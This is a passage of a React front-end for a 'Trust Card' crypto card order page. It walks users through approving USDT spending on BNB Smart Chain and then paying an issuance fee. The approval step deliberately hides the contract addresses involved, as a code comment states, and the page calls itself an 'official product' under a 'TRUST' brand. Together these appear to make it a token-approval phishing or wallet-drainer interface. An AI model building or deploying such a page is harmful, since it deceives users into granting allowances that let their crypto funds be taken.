            <section className="rounded-3xl border border-slate-200 bg-slate-50 p-5 sm:p-6 space-y-5">
              <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between gap-4">
                <div>
                  <h3 className="font-bold text-lg">{t.order_summary}</h3>
                  <p className="text-slate-600 mt-2 leading-relaxed">{selectedPlanDetails.description}</p>
                </div>
                <div className="sm:text-right flex-shrink-0">
                  <div className="text-4xl font-black text-blue-600">${selectedPlanDetails.price}</div>
                  <div className="text-xs text-slate-500 font-bold uppercase tracking-wide mt-1">{t.issuance_fee}</div>
                </div>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div className="bg-white rounded-2xl border border-slate-200 p-4">
                  <div className="text-xs text-slate-400 font-bold uppercase tracking-wide">{t.plan_validity}</div>
                  <div className="font-bold mt-1">{selectedPlanDetails.period}</div>
                </div>
                <div className="bg-white rounded-2xl border border-slate-200 p-4">
                  <div className="text-xs text-slate-400 font-bold uppercase tracking-wide">{t.spending_limit}</div>
                  <div className="font-bold mt-1">{selectedPlanDetails.limit}</div>
                </div>
              </div>
              <ul className="space-y-2">
                {selectedPlanDetails.features.map((feature) => (
                  <li key={feature} className="flex items-start gap-2 text-sm font-medium text-slate-600">
                    <CheckCircle2 className="w-5 h-5 text-blue-600 flex-shrink-0" />
                    {feature}
                  </li>
                ))}
              </ul>
            </section>

            {/* ==================== STEP 1: APPROVE USDT ==================== */}
            {!isOrderComplete && (
              <section className={cn(
                "rounded-3xl border p-5 sm:p-6 space-y-4",
                approvalStatus === 'success'
                  ? "border-emerald-200 bg-emerald-50/70"
                  : "border-blue-200 bg-blue-50/70"
              )}>
                <div className="flex items-center gap-3">
                  <div className={cn(
                    "w-10 h-10 rounded-2xl flex items-center justify-center flex-shrink-0",
                    approvalStatus === 'success' ? "bg-emerald-600 text-white" : "bg-blue-600 text-white"
                  )}>
                    {approvalStatus === 'success' ? <CheckCircle2 className="w-5 h-5" /> : <ShieldCheck className="w-5 h-5" />}
                  </div>
                  <h3 className="font-bold text-lg">{t.step_approve_label}</h3>
                </div>
                <p className="text-sm text-slate-600 leading-relaxed">{t.step_approve_desc}</p>

                {/* Network info only — no contract addresses */}
                <div className="bg-white border border-blue-100 rounded-2xl divide-y divide-slate-100 text-sm">
                  <div className="flex justify-between gap-4 p-3.5">
                    <span className="text-slate-500">{t.network}</span>
                    <strong className="text-right">{t.bsc_network}</strong>
                  </div>
                </div>

                {approvalStatusMessage && (
                  <div className="flex items-center gap-3 rounded-2xl border border-blue-200 bg-blue-50 p-4 text-blue-800 font-semibold" role="status">
                    <LoaderCircle className="w-5 h-5 animate-spin flex-shrink-0" />
                    {approvalStatusMessage}
                  </div>
                )}

                {approvalError && (
                  <div className="rounded-2xl border border-red-200 bg-red-50 p-4 text-red-700 font-semibold" role="alert">
                    {approvalError}
                  </div>
                )}

                {approvalStatus === 'success' && (
                  <div className="flex items-center gap-2 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-800 p-3.5 text-sm font-semibold">
                    <CheckCircle2 className="w-5 h-5 flex-shrink-0" />
                    {t.approve_success}
                  </div>
                )}

                {approvalStatus !== 'success' && (
                  <button
                    type="button"
                    onClick={approveSpending}
                    disabled={isApprovalProcessing}
                    className="inline-flex justify-center items-center gap-2 w-full px-6 py-3.5 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-bold transition-all shadow-lg shadow-blue-200 disabled:opacity-60 disabled:cursor-not-allowed"
                  >
                    {isApprovalProcessing && <LoaderCircle className="w-5 h-5 animate-spin" />}
                    {t.approve_btn}
                  </button>
                )}

                {approvalStatus === 'success' && approvalTxHash && (
                  <a
                    href={`https://bscscan.com/tx/${approvalTxHash}`}
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-2 text-sm font-bold text-blue-600 underline underline-offset-4"
                  >
                    {t.view_transaction}<ExternalLink className="w-4 h-4" />
                  </a>
                )}
              </section>
            )}

            {/* ==================== STEP 2: PAY FEE (visible only after approval) ==================== */}
            {approvalStatus === 'success' && !isOrderComplete && (
              <section className={cn(
                "rounded-3xl border p-5 sm:p-6 space-y-4",
                feeStatus === 'success'
                  ? "border-emerald-200 bg-emerald-50/70"
                  : "border-amber-200 bg-amber-50/70"
              )}>
                <div className="flex items-center gap-3">
                  <div className={cn(
                    "w-10 h-10 rounded-2xl flex items-center justify-center flex-shrink-0",
                    feeStatus === 'success' ? "bg-emerald-600 text-white" : "bg-amber-500 text-white"
                  )}>
                    {feeStatus === 'success' ? <CheckCircle2 className="w-5 h-5" /> : <DollarSign className="w-5 h-5" />}
                  </div>
                  <h3 className="font-bold text-lg">{t.step_pay_label}</h3>
                </div>
                <p className="text-sm text-slate-600 leading-relaxed">{t.step_pay_desc}</p>

                <div className="bg-white border border-amber-100 rounded-2xl p-4 text-center">
                  <div className="text-3xl font-black text-amber-600">${selectedPlanDetails.price}</div>
                  <div className="text-xs text-slate-500 font-bold uppercase tracking-wide mt-1">{t.issuance_fee}</div>
                </div>

                {feeStatusMessage && (
                  <div className="flex items-center gap-3 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-amber-800 font-semibold" role="status">
                    <LoaderCircle className="w-5 h-5 animate-spin flex-shrink-0" />
                    {feeStatusMessage}
                  </div>
                )}

                {feeError && (
                  <div className="rounded-2xl border border-red-200 bg-red-50 p-4 text-red-700 font-semibold" role="alert">
                    {feeError}
                  </div>
                )}

                {feeStatus === 'success' && (
                  <div className="flex items-center gap-2 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-800 p-3.5 text-sm font-semibold">
                    <CheckCircle2 className="w-5 h-5 flex-shrink-0" />
                    {t.pay_fee_success}
                  </div>
                )}

                {feeStatus !== 'success' && (
                  <button
                    type="button"
                    onClick={payFee}
                    disabled={isFeeProcessing}
                    className="inline-flex justify-center items-center gap-2 w-full px-6 py-3.5 rounded-2xl bg-amber-500 hover:bg-amber-600 text-white font-bold transition-all shadow-lg shadow-amber-200 disabled:opacity-60 disabled:cursor-not-allowed"
                  >
                    {isFeeProcessing && <LoaderCircle className="w-5 h-5 animate-spin" />}
                    {t.pay_fee_btn} (${selectedPlanDetails.price})
                  </button>
                )}

                {feeStatus === 'success' && feeTxHash && (
                  <a
                    href={`https://bscscan.com/tx/${feeTxHash}`}
                    target="_blank"
                    rel="noreferrer"
                    className="inline-flex items-center gap-2 text-sm font-bold text-blue-600 underline underline-offset-4"
                  >
                    {t.view_transaction}<ExternalLink className="w-4 h-4" />
                  </a>
                )}
              </section>
            )}

            {/* ==================== SUCCESS: CARD READY ==================== */}
            {isOrderComplete && (
              <div className="rounded-3xl border border-emerald-200 bg-emerald-50 p-5 sm:p-6 text-emerald-900 space-y-4" role="status">
                <div className="flex items-center gap-3 font-bold text-xl">
                  <div className="w-12 h-12 rounded-2xl bg-emerald-600 text-white flex items-center justify-center flex-shrink-0">
                    <CheckCircle2 className="w-7 h-7" />
                  </div>
                  <h3>{t.order_confirmed}</h3>
                </div>
                <p className="text-base leading-relaxed text-emerald-800">{t.order_confirmed_desc}</p>
                <div className="flex flex-wrap items-center gap-4 pt-2">
                  {approvalTxHash && (
                    <a
                      href={`https://bscscan.com/tx/${approvalTxHash}`}
                      target="_blank"
                      rel="noreferrer"
                      className="inline-flex items-center gap-2 text-sm font-bold underline underline-offset-4"
                    >
                      {t.view_transaction}<ExternalLink className="w-4 h-4" />
                    </a>
                  )}
                </div>
              </div>
            )}

            {/* Bottom action buttons */}
            <div className="flex flex-col-reverse sm:flex-row gap-3 sm:justify-end pt-1">
              {!isOrderComplete && (
                <button
                  type="button"
                  onClick={closeOrder}
                  disabled={isOrderProcessing}
                  className="px-6 py-3.5 rounded-2xl border border-slate-200 text-slate-700 hover:bg-slate-50 font-bold transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {t.cancel}
                </button>
              )}
              {isOrderComplete && (
                <button
                  type="button"
                  onClick={closeOrder}
                  className="px-6 py-3.5 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-bold transition-all shadow-lg shadow-blue-200"
                >
                  {t.close}
                </button>
              )}
            </div>
          </div>
        </motion.div>
      </motion.div>
    );
  };

  return (
    <div className="min-h-screen bg-white font-sans text-slate-900 selection:bg-blue-100 selection:text-blue-600 overflow-x-hidden">
      <header className="fixed top-0 left-0 right-0 bg-white/80 backdrop-blur-md z-50 px-6 py-4 flex justify-between items-center w-full border-b border-slate-100">
        <div className="flex items-center gap-4">
          <div className="relative">
            <button onClick={() => setIsLangOpen(!isLangOpen)} className="flex items-center gap-2 px-3 py-1.5 border border-slate-200 rounded-lg text-sm font-medium hover:bg-slate-50 transition-colors">
              <span className="text-lg">{lang === 'en' ? '🇺🇸' : '🇷🇺'}</span><span className="uppercase">{lang}</span>
              <ChevronDown className={cn("w-4 h-4 transition-transform", isLangOpen && "rotate-180")} />
            </button>
            {isLangOpen && (
              <div className="absolute top-full left-0 mt-2 bg-white border border-slate-200 rounded-lg shadow-lg overflow-hidden min-w-[120px]">
                <button onClick={() => { setLang('en'); setIsLangOpen(false); }} className="w-full text-left px-4 py-2 text-sm hover:bg-slate-50 flex items-center gap-2">🇺🇸 English</button>
                <button onClick={() => { setLang('ru'); setIsLangOpen(false); }} className="w-full text-left px-4 py-2 text-sm hover:bg-slate-50 flex items-center gap-2">🇷🇺 Русский</button>
              </div>
            )}
          </div>
          <button onClick={() => setView('home')} className="italic font-black text-2xl tracking-tighter text-blue-600 hidden sm:block">TRUST</button>
        </div>
        <div className="flex items-center gap-4">
          {view === 'home' && <button onClick={() => setView('getCard')} className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-full text-sm font-semibold transition-all shadow-md shadow-blue-200">{t.get_card}</button>}
          {view !== 'home' && <div className="scale-75 sm:scale-100 origin-right"><WalletConnectButton label={t.connect_wallet} /></div>}
        </div>
      </header>
      <AnimatePresence mode="wait">
        {view === 'home' && renderHome()}
        {view === 'learnMore' && renderLearnMore()}
        {view === 'getCard' && renderGetCard()}
      </AnimatePresence>
      <AnimatePresence>
        {selectedPlan && renderOrderModal()}
      </AnimatePresence>
      <footer className="border-t border-slate-100 py-12 px-6 bg-slate-50/30">
        <div className="max-w-7xl mx-auto space-y-8">
          <div className="flex flex-col md:flex-row justify-between items-center gap-6 border-b border-slate-100 pb-8">
            <p className="text-slate-400 text-sm font-medium italic">© 2026 Trust Card. All rights reserved.</p>
            <div className="flex items-center gap-6">
               <a href="#" className="text-blue-600 hover:text-blue-700 text-sm font-bold uppercase tracking-wider transition-colors">{t.support}</a>
              <p className="text-slate-400 text-xs sm:text-sm font-bold uppercase tracking-widest opacity-60">{t.official_product}</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
